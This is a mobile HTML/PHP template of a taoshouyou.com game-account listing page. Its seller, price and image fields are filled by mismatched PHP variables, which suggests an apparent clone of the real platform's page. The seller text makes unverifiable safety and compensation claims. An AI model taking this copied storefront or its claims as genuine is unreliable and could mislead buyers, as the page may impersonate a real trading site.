<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAD8AAAA5CAYAAACBBvPCAAAAAXNSR0IArs4c6QAABOpJREFUaAXtmUuMVEUUhqdnFCIujJsJgRXI2kQTR2bcmLAHeQz4VhRwxBBDCIGEpWEtjxDHKAEUUWNcsCZhcKEmJm4ICiQ4JGgE5DEwPjA40H7npk+nU1RVV9W9ffsymZP8qbp1Tp1z/lN1H13d0zMjMxUorQL1ev0x8AH4AXwHdoN5pSXQrUCQXAv+BqZMMLCiW3l1PC7k3gZ3TdYt11P01/gSQf8g2AHGwPcNyO45BBb65nZNR2IjwEccdSbeAmCxs2Fna8YZnNU1krbAJBRKXAk5C4DBSTVytE/YcujKGAm+BUJW3ORiLQBG50xD4/qZrhA1g5LUBpBCXPncUwAUhZF/wEy4qGshjq9RUHP4vMj4YfAXWAaeBKb0MfAZvnpqtdqXprKS1yS7HvhW/Bv0j2ry9PvALuCS5g7AoLCV1/iFtSS3DrQj/rAtIPPeBy7JCoCymuRJ7E3gI34CvZW4FgN9ux3wHzY+Kf+BRza5ibcUYI+PXRvdkPoppSWZN0DwimPbD/aDX8Bv4CuwqDVZrveCFCmPPNnJt7qP+Bj6OUqM/gC4CkyR7/2laict1/tMo4DrcsiTyOvgjiehMXQm8Rse+9vo5LWXCf0akF9/MdJ58mQTS/xp5viIK0FbAUZVGdAOavE60pLAayBmxYX4TRAqUoDnNHn6sgM+DJy8WOcV3pLAq8BH/Dj61q2+mOsY4phnYivAR6r0tJ3Z9gR8BZRBXLlJAZbrCtKXHfCxKh3te2pfWEugl0EM8UHsU1bc5GQrwH7TqOVa3jwjRRJ/CYfdIK6cpADNIy76veAAcIkUYGPuAuDkRTDlisK4eY/Lik967FNVtgIcbOPsneQC4PgFEEN8CPtOEFeO8l1v7oBDqnS0m6ILgKPnQZWIKzcpwEolRF9ugU9U6WjfVfu2LQ7WgCoSV262AnyqSke7OYT46ooTV25SgFVKiL4ciBxWpaPdovb3tEwYBuLUJebDrdP3uCsPHbcVQI69fLLVRnwVM+4n4kpQch5WQvRlBxxRpaPdpvby03EFuB+JKzfJfbUSoh9SgO2ZPcZn1IulNbd6p97jltBRQ7YCfO7xcCs7VsbgKaogEJExxU36X3BsfFsU2Mn4NdA8eZXxConkOZ98r0pO5NtLI98Fc8HdFtyhfzYjTydYcHgZ4/7gCeUbPgL5yZCwUplY+Tl2Qon2v4YSl5xSyP9UIpnYUFG5pfxdVcTKn4DVtyB7ltDKIjwO5PQm+lZkjkoUeZ0U3HLPPwvyyC5XMJzK31x5ZK3LdyHjZCZn7nlkgSsRnMqPlD9zOB9w+baNR9/zPFD+wFH2KrE5DBi74rLBt7yOrrv0bcbr6KNuyWjyjQSigrRJuij1BYonf3cHy3QiH/2wSyUfHSh4OdINo3NKJV/FbX8qtm7TiXw5K8+D5RJVTn0qxy5QiL086U+HGLbapK68+KjS1j/PgvzTSiykP13IR295KU4e8kkBQ1YkwSYplzzkq7TtZ8jH7pjklecB8zvBbsQG7IC9/B44k+I3mXwjWBW2/jgLcasb5JPutZREPXOSc8i78rGB/4VEu1Wa8BC1qWJzaPrIS/4onoRQqBxgi8qxsU8O+pSGTr7svjbGgi/znJdlQTh1GaAjfxg+5Ik6he5HcATy8oDyCj7lLG8JmO0xlPO/o/g75rHxqv4HeqH3Sez2tkUAAAAASUVORK5CYII=">
</div>
</a>
</div>
<div style="height:46px;"></div>            <input type="hidden" value="1" id="goodsid"><input type="hidden" value="42039020" id="zj-goodsdetail-goodsid"><input type="hidden" value="1" id="js-apppop-key"><input type="hidden" id="js-is-open-im" value="1">                                <div class="pinchzoom-banner new-swiper-container swiper-container-horizontal">
<ul class="swiper-wrapper" style="transition-duration: 0ms; transform: translate3d(0px, 0px, 0px);">
<li class="swiper-slide swiper-slide-active" data-index="0" style="width: 375px;">
<div class="swiper-lazy-preloader swiper-lazy-preloader-white"></div><div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img height="100%" src="<?php echo $_GoodsID['goods_img1'] ?>">
</div>
</li>
<li class="swiper-slide swiper-slide-next" data-index="1" style="width: 375px;">
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img height="100%" class="swiper-lazy swiper-lazy-loaded" src="<?php echo $_GoodsID['goods_img2'] ?>">
</div>
</li>
<li class="swiper-slide" data-index="2" style="width: 375px;">
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img height="100%" class="swiper-lazy swiper-lazy-loaded" src="<?php echo $_GoodsID['goods_img3'] ?>">
</div>
</li>
<li class="swiper-slide" data-index="3" style="width: 375px;">
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img height="100%" class="swiper-lazy swiper-lazy-loaded" src="<?php echo $_GoodsID['goods_img4'] ?>">
</div>
</li>
<li class="swiper-slide" data-index="4" style="width: 375px;">
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img height="100%" class="swiper-lazy" data-src="<?php echo $_GoodsID['goods_img5'] ?>">
</div>
</li>
<li class="swiper-slide" data-index="5" style="width: 375px;">
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img height="100%" class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/19/7925f1ea4aa0d9109c6183b13047ce72-pc-m.jpg">
</div>
</li>
<li class="swiper-slide" data-index="6" style="width: 375px;">
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img height="100%" class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/23/d489826a6840e807b0f0c16ef47ff481-pc-m.jpg">
</div>
</li>
<li class="swiper-slide" data-index="7" style="width: 375px;">
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img height="100%" class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/3/ab95017603193a74ba10c87b8bd4eaa5-pc-m.jpg">
</div>
</li>
<li class="swiper-slide" data-index="8" style="width: 375px;">
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img height="100%" class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/0/5e13b0ded91175ffc818e462ac39783b-pc-m.jpg">
</div>
</li>
<li class="swiper-slide" data-index="9" style="width: 375px;">
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img height="100%" class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/25/af7504a30924574d7943367757702133-pc-m.jpg">
</div>
</li>
<li class="swiper-slide" data-index="10" style="width: 375px;">
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img height="100%" class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/9/dcff482d89f0eb52f0a27e7f30aaab0a-pc-m.jpg">
</div>
</li>
</ul>
<div class="swiper-pagination swiper-pagination-bullets"><span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span></div>
</div>
<div id="slider" class="slider swiper-container">
<div class="goods-photo-tips"><span><i>!</i>如有联系方式均为骗子，请勿上当！</span></div>
<ul class="swiper-wrapper">
<li class="swiper-slide" data-index="0">
<div class="swiper-lazy-preloader swiper-lazy-preloader-white"></div>
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/10/9c285fca12dced5890482c4627c1c2a0-pc-l.jpg">
</div>
</li>
<li class="swiper-slide" data-index="1">
<div class="swiper-lazy-preloader swiper-lazy-preloader-white"></div>
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img class="swiper-lazy" data-src="<?php echo $_GoodsID['goods_img1'] ?>">
</div>
</li>
<li class="swiper-slide" data-index="2">
<div class="swiper-lazy-preloader swiper-lazy-preloader-white"></div>
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/3/5dc85908c6dc686a18afc340f6a5ae73-pc-l.jpg">
</div>
</li>
<li class="swiper-slide" data-index="3">
<div class="swiper-lazy-preloader swiper-lazy-preloader-white"></div>
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/10/de8480d7b1d13ed2cdb628a0f1f08338-pc-l.jpg">
</div>
</li>
<li class="swiper-slide" data-index="4">
<div class="swiper-lazy-preloader swiper-lazy-preloader-white"></div>
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/1/2daba481b54e079ef79366009dafdf64-pc-l.jpg">
</div>
</li>
<li class="swiper-slide" data-index="5">
<div class="swiper-lazy-preloader swiper-lazy-preloader-white"></div>
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/19/7925f1ea4aa0d9109c6183b13047ce72-pc-l.jpg">
</div>
</li>
<li class="swiper-slide" data-index="6">
<div class="swiper-lazy-preloader swiper-lazy-preloader-white"></div>
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/23/d489826a6840e807b0f0c16ef47ff481-pc-l.jpg">
</div>
</li>
<li class="swiper-slide" data-index="7">
<div class="swiper-lazy-preloader swiper-lazy-preloader-white"></div>
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/3/ab95017603193a74ba10c87b8bd4eaa5-pc-l.jpg">
</div>
</li>
<li class="swiper-slide" data-index="8">
<div class="swiper-lazy-preloader swiper-lazy-preloader-white"></div>
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/0/5e13b0ded91175ffc818e462ac39783b-pc-l.jpg">
</div>
</li>
<li class="swiper-slide" data-index="9">
<div class="swiper-lazy-preloader swiper-lazy-preloader-white"></div>
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/25/af7504a30924574d7943367757702133-pc-l.jpg">
</div>
</li>
<li class="swiper-slide" data-index="10">
<div class="swiper-lazy-preloader swiper-lazy-preloader-white"></div>
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container">
<img class="swiper-lazy" data-src="https://img2.taoshouyou.com/img/2022-01-16/9/dcff482d89f0eb52f0a27e7f30aaab0a-pc-l.jpg">
</div>
</li>
        <li class="swiper-slide">
<div class="swiper-lazy-preloader  swiper-lazy-preloader-white"></div>
<div class="pinch-zoom js-pinch-zoom swiper-zoom-container down-statistics1">
<a href="javascript:;">
<img src="./static/home/widget/goodsdetail/swiper/downapp_1bc13d7.jpg">
</a>
</div>
</li>
</ul>
<div class="swiper-pagination"></div>
</div>                            
<input id="curent_severName" type="hidden" value="_">
<input id="curent_url" type="hidden" value="/taoid_42039020.html">
<section class="new-title">
<input id="trade_name" type="hidden" value="">
<input id="bigdata_goodsname" type="hidden" value="账号">
<div class="price-box"><div class="new-price">￥<span><?php echo $_GoodsID['price']; ?></span>
</div>                            
<div>
<img src="./static/home/page/goodsdetail/bx_f71f3f6.png" alt="">
</div>                                                
<div class="seller-online-box">
<span>卖家<?php echo $_GoodsID['region'];?>小时前来过</span>
</div>
<div class="new-update-time">
<span>今日更新</span>                                                        
</div>
</div>
<div class="new-goodsname"><?php echo $_GoodsID['title'];?></div>
</section>
<div class="tags_box">
<div class="tags_list" id="tags_list_btn">
<ul>
<img src="./static/home/static/img/goodsdetail/anquan_873c02b.png" class="newimg"><li>已投保</li><li>寄售交易</li><li>商品有图</li><li>认证店铺</li>
</ul>
<div class="bind_more">···</div></div><div class="tags_list" id="new_tips_btn"><ul><img src="./static/home/static/img/goodsdetail/zheren_ec80c47.png" class="newimg"><li>平台免责声明</li><li>国家法律规定</li><li>不支持7天无理由</li></ul><div class="bind_more">···</div></div></div><div class="business-footer"><div class="icon"><img src="./img/3b6ea5fb6e914fe76eb43fd4c885fb80.png"></div><div class="business-footer-right"><a href="https://9.taoshouyou.com/app-v2"><div class="public_tag_ad_title">千款手游, 首充3折起, 续充低至5折 &gt;</div></a></div></div>                        <div class="business-footer"><div class="icon"><img src="./static/home/static/img/index/safeicon_b2892c4.png"></div><div class="business-footer-right"><div class="newNum"><div class="more"><p class="more-wrap">投保订单-已完成赔付案例</p></div><a href="http://m.taoshouyou.com/help/default/safety-guarantee"><div class="tradetitle"><div id="activity" class="module"><div class="module_title"><span>【穿越火线...】用户60****                                                    获赔金额588.00元</span><b>01-16</b></div><div class="module_title"><span>【阴阳师】用户61****                                                    获赔金额300.00元</span><b>01-16</b></div><div class="module_title"><span>【一剑斩仙】用户95****                                                    获赔金额260.00元</span><b>01-16</b></div><div class="module_title"><span>【王者联盟】用户16****                                                    获赔金额660.00元</span><b>01-15</b></div><div class="module_title"><span>【绝地求生...】用户22****                                                    获赔金额1050.00元</span><b>01-15</b></div><div class="module_title"><span>【王者荣耀...】用户27****                                                    获赔金额155.00元</span><b>01-15</b></div><div class="module_title"><span>【STEA...】用户75****                                                    获赔金额100.00元</span><b>01-15</b></div><div class="module_title"><span>【寻仙手游】用户06****                                                    获赔金额882.00元</span><b>01-15</b></div><div class="module_title"><span>【三国杀】用户75****                                                    获赔金额1380.00元</span><b>01-15</b></div><div class="module_title"><span>【奶块】用户58****                                                    获赔金额220.00元</span><b>01-15</b></div><div class="module_title"><span>【王者联盟】用户64****                                                    获赔金额240.00元</span><b>01-15</b></div><div class="module_title"><span>【奥拉星】用户21****                                                    获赔金额260.00元</span><b>01-15</b></div><div class="module_title"><span>【地下城堡...】用户39****                                                    获赔金额50.00元</span><b>01-15</b></div><div class="module_title"><span>【王者联盟】用户19****                                                    获赔金额388.00元</span><b>01-15</b></div><div class="module_title"><span>【崩坏3r...】用户91****                                                    获赔金额290.00元</span><b>01-15</b></div><div class="module_title"><span>【金铲铲之...】用户68****                                                    获赔金额297.00元</span><b>01-15</b></div><div class="module_title"><span>【王者荣耀】用户70****                                                    获赔金额388.00元</span><b>01-15</b></div><div class="module_title"><span>【王者联盟】用户61****                                                    获赔金额400.00元</span><b>01-14</b></div><div class="module_title"><span>【王牌竞速】用户26****                                                    获赔金额240.00元</span><b>01-14</b></div><div class="module_title"><span>【王者荣耀】用户28****                                                    获赔金额500.00元</span><b>01-14</b></div><div class="module_title"><span>【穿越火线...】用户60****                                                    获赔金额588.00元</span><b>01-16</b></div><div class="module_title"><span>【阴阳师】用户61****                                                    获赔金额300.00元</span><b>01-16</b></div><div class="module_title"><span>【一剑斩仙】用户95****                                                    获赔金额260.00元</span><b>01-16</b></div><div class="module_title"><span>【王者联盟】用户16****                                                    获赔金额660.00元</span><b>01-15</b></div><div class="module_title"><span>【绝地求生...】用户22****                                                    获赔金额1050.00元</span><b>01-15</b></div><div class="module_title"><span>【王者荣耀...】用户27****                                                    获赔金额155.00元</span><b>01-15</b></div><div class="module_title"><span>【STEA...】用户75****                                                    获赔金额100.00元</span><b>01-15</b></div><div class="module_title"><span>【寻仙手游】用户06****                                                    获赔金额882.00元</span><b>01-15</b></div><div class="module_title"><span>【三国杀】用户75****                                                    获赔金额1380.00元</span><b>01-15</b></div><div class="module_title"><span>【奶块】用户58****                                                    获赔金额220.00元</span><b>01-15</b></div><div class="module_title"><span>【王者联盟】用户64****                                                    获赔金额240.00元</span><b>01-15</b></div><div class="module_title"><span>【奥拉星】用户21****                                                    获赔金额260.00元</span><b>01-15</b></div><div class="module_title"><span>【地下城堡...】用户39****                                                    获赔金额50.00元</span><b>01-15</b></div><div class="module_title"><span>【王者联盟】用户19****                                                    获赔金额388.00元</span><b>01-15</b></div><div class="module_title"><span>【崩坏3r...】用户91****                                                    获赔金额290.00元</span><b>01-15</b></div><div class="module_title"><span>【金铲铲之...】用户68****                                                    获赔金额297.00元</span><b>01-15</b></div><div class="module_title"><span>【王者荣耀】用户70****                                                    获赔金额388.00元</span><b>01-15</b></div><div class="module_title"><span>【王者联盟】用户61****                                                    获赔金额400.00元</span><b>01-14</b></div><div class="module_title"><span>【王牌竞速】用户26****                                                    获赔金额240.00元</span><b>01-14</b></div><div class="module_title"><span>【王者荣耀】用户28****                                                    获赔金额500.00元</span><b>01-14</b></div></div></div></a></div></div></div>            <div id="js-p-goodsdetail-icon" class="w-icon js_mask_parent">
<ul class="w-icon-list js_mask_children">
<li class="w-icon-list-li">
<p class="w-icon-list-li-title w-icon-list-li-pei">
找回包赔</p>
<div class="w-icon-list-li-content">
卖家已为该帐号投保，如帐号出现找回、封号、收回，你将获得理赔。</div>
</li>
        <li class="w-icon-list-li">
<p class="w-icon-list-li-title w-icon-list-li-ji">
寄售交易</p>
<div class="w-icon-list-li-content">
帐号密码在淘手游，付款后由平台客服发货，客服24小时在线</div>
</li>
        <li class="w-icon-list-li">
<p class="w-icon-list-li-title w-icon-list-li-dian">
认证店铺</p>
<div class="w-icon-list-li-content">
该商品的卖家，已经通过了淘手游严格认证，并具备一定信誉</div>
</li>
                <li class="w-icon-list-li ">
<p class="w-icon-list-li-title w-icon-list-li-tu">
有图商品</p>
<div class="w-icon-list-li-content">
该商品已经上传多张游戏截图，你可以查看截图了解详细信息</div>
</li>
                </ul>
<span class="w-icon-close"></span>
</div>            
<div class="sdkad-box  down-statistics" style="margin-bottom:0.1rem;">
    <a href="javascript:;" id="js-sdkad-href">
        <img src="./static/home/static/img/goodslist/download_e0f39f2.jpg" alt="" id="js-sdkad-img">
        </a>
        </div>
        <ul class="tab-nav clearfix">
            <li class="tab-nav-item fl">
                <p class="tab-nav-item-p">商品信息</p>
                </li>
                <li class="tab-nav-item fl">
                    <p class="tab-nav-item-p active">购买流程</p>
                    </li>
                    </ul>
                    <ul class="tab-panel">
                        <li class="tab-panel-item" style="display: none;">
                            <div class="module pro_info pro_bottom_none">
                                <dl>
                                    <dd>
                                        <span class="gray pro_info_left">商品ID</span>
                                        <span class="pro_info_right">42039020</span>
                                        </dd>
                                        <dd>
                                            <span class="gray pro_info_left">客户端</span>
                                        <span class="pro_info_right"><?php echo $_GoodsID['region'];?>
                                        </span>
                                        </dd>
                                        <dd>
                                            <span class="gray pro_info_left">服务器</span>
                                            <span class="pro_info_right">全部区服</span>
                                            </dd>
                                            <dd>
                                                <span class="gray pro_info_left">防沉迷</span>
                                                <span class="pro_info_right">无</span>
                                                </dd>  
                                                <dd>
                                            <span class="gray pro_info_left">皮肤数</span>
                                            <span class="pro_info_right"><?php echo $_GoodsID['att_capacity'];?></span>
                                            </dd>
                                            <dd>
                                            <span class="gray pro_info_left">英雄数</span>
                                            <span class="pro_info_right"><?php echo $_GoodsID['att_color'];?></span>
                                            </dd>
                                                <div class="clear">
                                                    
                                                </div>
                                                </dl>                                                                                            </div><div class="w-shop">
<p class="c2 w-shop-title">店铺信息</p>
<div class="shop_box">
<div class="shop_img">
<img src=" <?php echo $_GoodsID['user_portrait']; ?>" alt="">
</div>
<div class="shop_msg">
<div class="shop_name"><?php echo $_GoodsID['user_name'];?><img src="./static/home/widget/goodsdetail/shop/rz_8c4795e.png" alt="">
</div>
<div class="shop_soldCnt">已成交<span><?php echo $_GoodsID['recovery_rate'];?></span>笔</div>
</div>
<div>
<a href="/shopinfo?id=8776" class="shop_href">进店看看</a>
</div>
</div>
<div class="shop_tradeRate">
<div>交易成交率：<span>95%</span></div>
<div>在售商品：<span><?php echo $_GoodsID['tran_num'];?>件</span></div>
</div>
</div>
                                                                        <div class="module pro_info description" style=""><dl><dt>卖家描述</dt>                            <dd><span class="gray pro_info_left">账号亮点</span><span class="pro_info_right">我们这是淘手游认证店铺出的，通过了平台严格认证，并具备一定信誉，售后有保障。本店商品经过一系列的严格筛选99%安全。账号。我们店是终身找回包赔，48小时极速赔付。我们随时都在你拍下就可以配合你交易。</span></dd>                                                                          </dl></div><div class="frontgreydev" id="trademsg-comment-div"><div class="hide-bg"></div><div class="module pro_info description comment liuyan-q"><div class="comment-title-div">发布留言</div><textarea class="comment-textarea" id="comment-content" placeholder="请输入......" maxlength="140"></textarea><div class="comment-bytes" id="comment-bytes"><span class="comment-current-bytes" id="comment-current-bytes">0</span>/<span class="trademsg-bytes">140</span></div><div class="comment-cancel" id="comment-cancel">取消</div><div class="comment-submit" id="comment-submit" data-src="/trademsg/index/newmsg" data-tradeid="42039020">提交</div></div></div><div class="frontgreydev" id="trademsg-reply-div"><div class="hide-bg"></div><div class="module pro_info description comment liuyan-q"><div class="comment-title-div">回复@<span id="reply-to" data-id=""></span></div><textarea class="comment-textarea" id="reply-content" placeholder="请输入......" maxlength="140"></textarea><div class="comment-bytes" id="comment-bytes"><span class="reply-current-bytes" id="reply-current-bytes">0</span>/<span class="trademsg-bytes">140</span></div><div class="comment-submit-div"><div class="comment-cancel" id="reply-cancel">取消</div><div class="comment-submit" id="reply-submit" data-src="/trademsg/index/newreply" data-commentid="" data-tomsgid="">提交</div></div></div></div><div class="frontgreydev" id="trademsg-operate"><div class="hide-bg"></div><div class="module buttongroup"><div class="replybtn" id="replybtn" data-id="" data-tomsgid="">回复</div><div class="tipoffbtn" id="tipoffbtn" data-id="" data-username="" data-timelone="" data-content="">举报</div><div class="deletebtn" id="deletebtn" data-id=""><a href="javascript:">删除</a></div><div class="cancelbtn" id="cancelbtn">取消</div></div></div><div class="frontgreydev" id="trademsg-delete-confirm-div"><div class="module deleteconfirm-alert"><div class="deleteconfirm-question">是否确定要删除此留言？</div><div class="deleteconfirm-describe">删除后将不可恢复</div><div class="deleteconfirm-cancel" id="deleteconfirm-cancel">取消</div><div class="deleteconfirm-sure" id="deleteconfirm-sure" data-id="">删除</div></div></div><div class="frontgreydev-tipoff" id="trademsg-tipoff-div"><div class="hide-bg"></div><div class="module pro_info description  liuyan-tipoff"><div class="module tipoff-div"><div class="tipoff-title">举报留言</div><div class="tipoff-cancel" id="tipoff-cancel">取消</div><div class="trademsg-headimg-div"><img id="tipoff-comment-headimg" class="trademsg-headimg" src=""></div><div class="trademsg-main-div"><div id="tipoff-comment-username" style="line-height:25px;"></div><div id="tipoff-comment-content" class="trademsg-content-div tipoff-talker"></div><div id="tipoff-comment-timelong" class="trademsg-time-div"></div></div></div><div class="module tipoff-reason-div">举报原因<div class="reason-coat"><div class="reason-item" data-id="1">语言暴力</div><div class="reason-item" data-id="2">骚扰/广告</div><div class="reason-item" data-id="3">色情/违法</div><div class="reason-item" data-id="4">诱导到线下联系/诈骗</div><div class="reason-item" data-id="5">其他</div></div>举报详情<div class="reason-detail"><textarea class="tipoff-textarea" id="tipoff-content"></textarea><div class="comment-bytes" id="comment-bytes"><span class="tipoff-current-bytes" id="tipoff-current-bytes">0</span>/<span class="trademsg-bytes">140</span></div></div><div class="tipoff-submit" id="tipoff-submit" data-commentid="">提 交</div></div></div></div>            <div><div class="extension-pop-wrap" id="js-extension-wrap"><div class="extension-pop-con  clearfix"><div class="extension-top"><p>安装<span>淘手游app</span>，可直接与卖家咨询商品细节及价格。</p></div><div class="extension-note"><img src="./img/extensionapp/tk.png" alt=""></div><div class="extension-list"><div><a href="/indexpage/index/downloadapp" class="extension-check-btn" data-role="none">立即安装</a></div></div><div class="extension-down"><div class="close"><img src="./img/extensionapp/close.png" alt=""></div></div></div></div></div><script src="http://hm.baidu.com/hm.js?99e55629a8abb60a322e77b53fd2f343"></script><script>
                    var c, _ = Function;
                    with(o = document.getElementById("activity")) { innerHTML += innerHTML;
                            onmouseover = _("c=1");
                            onmouseout = _("c=0"); }
                        (F = _("if(#%30||!c)#++,#%=o.scrollHeight>>1;setTimeout(F,#%30?10:1500);".replace(/#/g,
                            "o.scrollTop")))();
                </script>                                                                                    <section id="sc_recommend" class="w-look"><p class="c2 w-look-title">看了又看<span></span></p></section>                            </li><li class="tab-panel-item" style="display: block;"><ul class="w-buysteps">                                                                <li class="w-buysteps-step1 w-buysteps-step"><p>议价验号</p><p class="red">通过APP，与卖家商议价格及保险，并向卖家索要账号最新截图，确认后下单购买。</p></li><li class="w-buysteps-step2 w-buysteps-step"><p>客服介入换绑</p><p>下单后，客服会最短时间与您取得联系，为买卖双方账号解绑换绑。</p></li><li class="w-buysteps-step3 w-buysteps-step"><p>买家收货</p><p>换绑过户成功后，客服将账号资料发送给买家确认，无误后确认收货，交易完成。</p></li><li class="w-buysteps-step4 w-buysteps-step"><p>系统自动收货时间</p><p>普通账号24小时自动确认收货，网易账号48小时，腾讯账号7天。</p></li></ul></li><div class="show_tags_box" style="display: none;"><div class="cont_box">                <div class="tags_li tags_pei_li"><p>已投保</p><div>卖家已为该账号投保，如帐号出现找回、封号、收回，您将获得理赔。</div></div>                <div class="tags_li tags_ji_li"><p>寄售交易</p><div>帐号密码在淘手游，付款后由平台客服发货，客服24小时在线。</div></div>                <div class="tags_li tags_tu_li"><p>商品有图</p><div>该商品已经上传多张游戏截图，你可以查看截图了解详细信息。</div></div>                                <div class="tags_li tags_pu_li"><p>认证店铺</p><div>该商品的卖家，已经通过了淘手游的严格认证，并具备一定信誉。</div></div><div class="show_tags_btn">确定</div></div></div><div class="statement_box" style="display: none;"><div class="cont_box"><div class="list_li"><p>平台免责声明</p><div>所展示的商品供求信息由买卖双方自行提供，其真实性、准确性和合法性由信息发布人负责。</div></div><div class="list_li"><p>国家法律规定</p><div>国家法律规定，未成年人不能参与虚拟物品交易。</div></div><div class="list_li"><p>不支持7天无理由</p><div>本平台提供的数字化商品根据商品性质不支持七天无理由退货服务。</div></div><div class="statement_btn">确定</div></div></div></ul>                    <div class="sdkad-box js-sdkad-btn" style="margin-bottom:10px;" data-adpagezh="王者荣耀" data-adpageen="tradeinfo_sdk_download_ad">
<a href="https://m.taoshouyou.com/dailian/index/" id="js-sdkad-href">
<img src="./img/706f5a2341182c91640878fa4591b104.png" alt="" id="js-sdkad-img">
</a>
<i class="icon">广告</i>
<input type="hidden" value="/trades/trade-info" class="js-type">
<input type="hidden" value="https://m.taoshouyou.com/dailian/index/" class="js-url">
</div>
                    <script>
	NTKF_PARAM = {
		siteid:"kf_9098",                    
		settingid:"kf_9098_1504680735895",   
		uid:"",                              
		uname:"",                            
		isvip:"0",                           
		userlevel:"0",                       
		erpparam:"erp"                       
	};

	
	if(NTKF_PARAM.uid == ''){
		if(xnGetCookie('tsyguestid') != ''){
			NTKF_PARAM.uid = xnGetCookie('tsyguestid');
		}else{
			var guestuuid  = 'tsyguest_h5_'+xnUuid(12,16);
			xnSetCookie('tsyguestid',guestuuid,1);
			NTKF_PARAM.uid = guestuuid;
		}
	}

	var xnScript = document.createElement('script');
	//xnScript.setAttribute('src', 'https://dl.ntalker.com/js/xn6/ntkfstat.js?siteid=kf_9098');
	document.body.appendChild(xnScript);


	function xnSetCookie(cname, cvalue, exdays) {  
	    var d = new Date();  
	    d.setTime(d.getTime() + (exdays*24*60*60*1000));  
	    var expires = "expires="+d.toUTCString();  
	    document.cookie = cname + "=" + cvalue + "; " + expires;  
	}  
	
	function xnGetCookie(cname) {  
	    var name = cname + "=";  
	    var ca = document.cookie.split(';');  
	    for(var i=0; i<ca.length; i++) {  
	        var c = ca[i];  
	        while (c.charAt(0)==' ') c = c.substring(1);  
	        if (c.indexOf(name) != -1) return c.substring(name.length, c.length);  
	    }  
	    return "";  
	}  
	
	function xnUuid(len, radix) {
		var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.split('');
		var uuid = [], i;
		radix = radix || chars.length;
	
		if (len) {
			for (i = 0; i < len; i++) uuid[i] = chars[0 | Math.random()*radix];
		} else {
			var r;
			uuid[8] = uuid[13] = uuid[18] = uuid[23] = '-';
			uuid[14] = '4';
			for (i = 0; i < 36; i++) {
				if (!uuid[i]) {
					r = 0 | Math.random()*16;
					uuid[i] = chars[(i == 19) ? (r & 0x3) | 0x8 : r];
				}
			}
		}
		return uuid.join('');
	}
</script>
                  <style>#other {margin-bottom:0;}</style><div id="other" class="module"><div class="other-content clearfix"><div class="other_box"><a data-ajax="false" href="/">首页</a></div><div class="other_box"><a data-ajax="false" href="/siteauth/auth/login" id="other_tsy_help">登录</a></div><div class="other_box"><a href="/user/selltrade/index">我要卖</a></div><div class="other_box"><a data-ajax="false" href="/indexpage/index/downloadapp">下载app</a></div></div></div><div class="module public-footer"><div class="switch-btn clearfix"><div class="btn red-btn"><a href="/">手机版</a></div><div class="btn red-btn"><a href="http://www.taoshouyou.com/">电脑版</a></div><div class="btn red-btn"><a href="http://www.taoshouyou.com/">APP版</a></div></div><div class="module footer"><div class="footer_content"><p>在线客服：<a href="" style="color: #333;margin: 10px 0;text-decoration: underline;">点击咨询</a></p><p>专业的手游交易平台</p><p>©www.taoshouyou.com 黔ICP备14000393号-1</p></div></div></div><div class="clear"></div>            <div style="height:.44rem;"></div><div class="duibi"><img src="./img/contrast/duibi.png"><span></span></div><input class="goodsid" type="hidden" data-id="42039020"><div class="tips"></div>     <section class="pro_submit b-button-box" data-goods="1" data-sellmode="1"><div class="mongolian-layer"></div>
<div class="mongolian-container">
<img class="auth-pic" src="./img/user/auth-head-bg.png">
<p class="auth-topic">实名认证</p>
<p class="auth-content">您需要进行实名认证，才可以进行商品交易哦。</p>
<button class="auth-bg" id="auth-btn">立即去实名认证</button>
<div class="cancel-auth"><img src="./img/user/cancel.png"></div>
</div>
<div class="message-bg">
<div class="message-box">
<p class="title"></p>
<div class="message-center">
